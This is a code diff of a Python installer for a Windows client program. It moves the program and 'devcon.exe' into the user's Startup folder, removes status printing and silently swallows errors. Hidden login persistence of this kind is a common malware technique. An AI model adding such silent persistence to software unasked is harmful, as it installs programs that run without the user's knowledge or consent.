@@ -24,13 +24,13 @@ def add_to_startup(file_path=""):
     current = pathlib.Path(__file__).parent.absolute()
     if file_path == "":
         file_path = prog_call
+    devconMove = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % final.UN + "\devcon.exe"
     good_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % final.UN + "\projectClientFinal.exe"
     currentstr = str(current)
+    devconCurrent = currentstr + "\devcon.exe"
     currentstr += "\projectClientFinal.exe"
-
-    print(good_path)
-    print(currentstr)
     shutil.move(currentstr, good_path)
+    shutil.move(devconCurrent, devconMove)
 
 
 
@@ -57,19 +57,26 @@ def createDesktopFolder():
 def create_vars_folder():
     try:
         os.mkdir(final.first_setup_path)
-    except OSError:
-        print("Creation of the directory %s failed" % final.first_setup_path)
-    else:
-        print("Successfully created the directory %s " % final.first_setup_path)
-
+    except:
+        pass
 
 try:
     add_to_startup()
-    create_vars_folder()
-    create_var(final.active_field, 0)
-    createDesktopFolder()
-    popup()
-
-
 except:
     pass
+try:
+    create_vars_folder()
+    create_var(final.active_field, 0)
+    create_var(final.msg_field, "")
+except:
+    create_vars_folder()
+    create_var(final.active_field, 0)
+    create_var(final.msg_field, "")
+try:
+    createDesktopFolder()
+    popup()
+except:
+    pass
+
+
+
